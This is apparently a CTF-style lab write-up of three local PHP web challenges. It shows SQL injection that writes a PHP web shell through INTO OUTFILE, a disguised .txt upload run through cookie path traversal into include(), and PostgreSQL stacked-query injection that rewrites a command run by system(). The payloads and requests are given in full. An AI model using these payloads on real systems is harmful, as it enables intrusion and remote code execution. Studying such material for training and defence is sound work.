[Level 1]

[*] Target: http://localhost:8091/

    - Playing around a little bit, we only can see some simple text about 3 kinds of attack

        [+] http://localhost:8091/post.php?id=1 <=> SSRF Tutotial

        [+] http://localhost:8091/post.php?id=2 <=> XSS Tutotial

        [+] http://localhost:8091/post.php?id=3 <=> RECON Tutotial

    - database.php is just used to connect to the database, however, the database isn't a separate one from the web server, the first time I saw CBJS do this

        [+] docker-compose.yaml

            services:
            web:
                container_name: level1
                build: ./web
                ...
                volumes:
                - "./web/html/:/var/www/html/"

            => See! This time database is running on the web

    - I know! The target is to read the flag, but there is no flag in the db, instead, it's in the web's root folder (/flag_a7bd2)

    => This means we should RCE it right? However, I didn't see any unsafe method related to command injection

    - But I found that we can easily SQLi 

        [+] post.php

            ...
            if (isset($_GET['id'])) {
                $sql = "SELECT * FROM posts WHERE id=" . $_GET['id'];
                $result = $conn->query($sql) or die(mysqli_error($conn)); // [?] No filter (~.~!) and $_GET['id'] is an unstrusted data 
                if ($result->num_rows > 0) {
            ...
    
    - The main question is "Can SQL lead to command injection?" Luckily! the answer is YES

        => I found this payload on the internet: 'union select 1,'<?php system($_GET["cmd"]); ?>',3,4 intooutfile 'C:\\xampp\\htdocs\\rce.php' --

        => This man is trying to write a PHP payload into the C:\\xampp\\htdocs (It kinda same as/var/www/html)

        - This sounds a little bit stupid in the case of the developer never giving us permission to create a file in the sensitive folder

    - Guess what! CBJS actually does that

        [+] Dockerfile

            ...
            WORKDIR /var/www/html/
            COPY ./html/ .
            COPY flag /flag_a7bd2

            # Set up permissions for the owner
            RUN chown -R root:www-data .
            RUN find . -type f -exec chmod 640 {} \;
            RUN find . -type d -exec chmod 750 {} \;
            RUN chmod 777 . 
            ...

            => They gave us permission to do so

    - db.sql shows that there are 4 columns

        CREATE TABLE `posts`(
            `id` INT NOT NULL PRIMARY KEY,
            `title` TEXT NOT NULL,
            `content` TEXT NOT NULL,
            `author` VARCHAR(50) NOT NULL
        );

    => SELECT * FROM posts WHERE id=31337 UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL, NULL, NULL INTO OUTFILE '/var/www/html/rce.php'

        =>  root@6139b6b509a8:/var/www/html# ls -al
    
            drwxrwxrwt 2 root  www-data 4096 Jan 31 12:20 .
            drwxr-xr-x 1 root  root     4096 Jan 30 02:58 ..
            -rw-r----T 1 root  www-data  199 Apr 26  2023 database.php
            -rw-r----T 1 root  www-data  668 Apr 26  2023 index.php
            -rw-r----T 1 root  www-data  733 Apr 26  2023 post.php
            -rw-r----- 1 mysql mysql      40 Jan 31 12:20 rce.php

    => http://localhost:8091/rce.php?cmd=id  <=>  uid=33(www-data) gid=33(www-data) groups=33(www-data),999(mysql)

    [Final Result: RCE] http://localhost:8091/rce.php?cmd=cat%20/flag_a7bd2  <=>  CBJS{FAKE_FLAG_FAKE_FLAG}


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


[Level 2]

[*] Target: http://localhost:8092/

    - On the main page you can read a small text about "Information Security", also you can send them your thoughts about that info with an attached file (if you want to)

    [Just Playing Around]

        POST / HTTP/1.1
        Host: localhost:8092

        ...
        Cookie: PHPSESSID=ecc52682d0abdbbd13505db82f534ed7; lang=en.html
        Connection: close

        ------WebKitFormBoundarypoe3Kt1b2PHPoGvD
        Content-Disposition: form-data; name="comment"

        Wanna play Yugioh (~.~?)
        ------WebKitFormBoundarypoe3Kt1b2PHPoGvD
        Content-Disposition: form-data; name="file"; filename="suggest.txt"
        Content-Type: text/plain

        Well done!

        ------WebKitFormBoundarypoe3Kt1b2PHPoGvD--

        => You can easily find where your attached file is stored by clicking on "Open link in a new tab" in the download icon of your own comment

           In my case, http://localhost:8092/upload/5eb31f04e271af0eb4a6d4f9a3949811/suggest.txt <=> Well done!

    - This might be a file upload attack, but when I check the source code, Nahhh (~.~!)

        [+] index.php

            ...
            if (!empty($_FILES["file"]["name"])) {
                $extensions = array('jpg', 'png', 'txt');
                $file_path = $dir . "/" . $_FILES["file"]["name"];
                $file_extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION)); // [?] no PHP file allowed and no way to bypass (~.~!)
                if (!in_array($file_extension, $extensions)) {
                    $msg = "File extension is not allowed";
                    $file_path = "";
                } else {
                    move_uploaded_file($_FILES["file"]["tmp_name"], $file_path);
                }
            }
            ...
            insert_one( "INSERT INTO comments(display_name, comment, image) VALUES (?, ?, ?)", "Anonymous", $_POST['comment'], $file_path);
            // [?] insert_one() is really secure (just look at database.php), SQLi might not be a wise choice

    - admin.php seems to have a lot of fun but I didn't find any way to perform SSRF

    - After 3 days of thinking, and find all untrusted datas, I found some really cool stuff

        POST / HTTP/1.1
        Host: localhost:8092

        ...
        Cookie: PHPSESSID=ecc52682d0abdbbd13505db82f534ed7; lang=en.html // [?] This one!
        Connection: close
        ...
    
    - And what do we have here 

        [+] index.php

            ...
            if (!isset($_COOKIE['lang'])) { // [?] This always appeared in our cookie (^.^~) "lang=en.html"
                setcookie("lang", "en.html", time() + (86400 * 30), "/");
                die(header("Location: /"));
            }
            ...
            try {
                $row = select_one("select value from config where name = \"lang_path\"");
                $lang_path = $row["value"];
                include($lang_path . $_COOKIE['lang']); 
                // [?] This means (^.^~) we can change the path and include() helps us to execute PHP without even caring about payload extension          
            } ...

        - Let's see, what is the value of $lang_path

            mysql> select * from config;
            +----+-----------+---------+
            | id | name      | value   |
            +----+-----------+---------+
            |  1 | lang_path | ./lang/ |
            +----+-----------+---------+
        
            -> With a little bit Path Traversal, like ./lang/../upload/5eb31f04e271af0eb4a6d4f9a3949811/RCE.txt
               
               (Okay RCE.txt just a simple payload I uploaded _ <?php system("cat flag /flag_61ea"); ?>, and lang folder are in the /var/www/html, 1 "../" is enough)

    [Testing Time]

        - Click on the Icon "EN" or "VN" to change the interface, then you just need to modify it to "lang" in the cookie header

            GET / HTTP/1.1
            Host: localhost:8092
            ...
            Cookie: PHPSESSID=ecc52682d0abdbbd13505db82f534ed7; lang=../upload/5eb31f04e271af0eb4a6d4f9a3949811/RCE.txt
            Connection: close

            => CBJS{FAKE_FLAG_FAKE_FLAG}

    [Final Result: RCE] http://localhost:8092  <=>  CBJS{FAKE_FLAG_FAKE_FLAG}    


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


[Level 3]

[*] Target: http://localhost:8093/

    - Finally, the last exercise of this training path, and I must say that CBJS poured all their heart and soul into this lab

    - No more MySQL, we have to face up with PostgreSQL

        [+] docker-compose.yaml

            ...
            db:
                container_name: level3_db
                build: ./db
                environment:
                POSTGRES_USER: postgres
                POSTGRES_PASSWORD: changeme
                POSTGRES_DB: mydb
                restart: unless-stopped
            ...
    
        -> which means, there are some differences in the connect to database function in their PHP code like pg_query() <-> query() ...

    - But don't worry "Mindset is everything!"

    I don't like the previous level, this time, I can easily find the sink

        [+] install.php

            ...
            $result = pg_query($db, "SELECT value FROM configs WHERE name = 'install_script'");
            $row = pg_fetch_row($result);
            $install_script = $row[0];
            
            system($install_script); // [?] Just need a way to update the value columns in the configs table

        [+] db.sql

            ...
            CREATE TABLE configs (
            id SERIAL PRIMARY KEY,
            name varchar(255) NOT NULL,
            value varchar(255) NOT NULL
            );

            INSERT INTO configs (name, value) VALUES ('install_script', '/opt/install.sh');
            ...

    - How can we do that ??? Easy, kinda the same place in the previous level

        [+] index.php
            
            ...
            if (isset($_GET["lang"])) {
            $language = $_GET["lang"];
            unset($_COOKIE);
            setcookie('lang', $language, time() + 60 * 60 * 24 * 30, '/', $_SERVER['SERVER_NAME']);
            }
            ...
            if (isset($_COOKIE['lang'])) {
            $language = $_COOKIE['lang'];
            }

            $result = pg_query($db, "SELECT id, title, content, link FROM news WHERE language = '$language'"); 
            
            // [?] As I said before "pg_query() <-> query()", and yep! they are all vulnerable with SQLi

            // [?] Since a cookie isn't a good place to store a bunch of SQL code, so attacking $_GET["lang"] is a better choice to avoid query error
            
            $row = pg_fetch_row($result);
            ?>
            ...

    => SELECT id, title, content, link FROM news WHERE language = 'x'; UPDATE configs SET value = 'cat /flag_d8f2' WHERE name = 'install_script'; --

    [Testing Time]

    GET /index.php?lang=x';+UPDATE+configs+SET+value+=+'cat+/flag_d8f2'+WHERE+name+=+'install_script';--

                                            |
                                            v

                            mydb=# select * from configs;
                            id |      name      |     value      
                            ----+----------------+----------------
                            1 | install_script | cat /flag_d8f2
       
    [Final Result: RCE] http://localhost:8093/install.php <=> http://localhost:8093/install.php
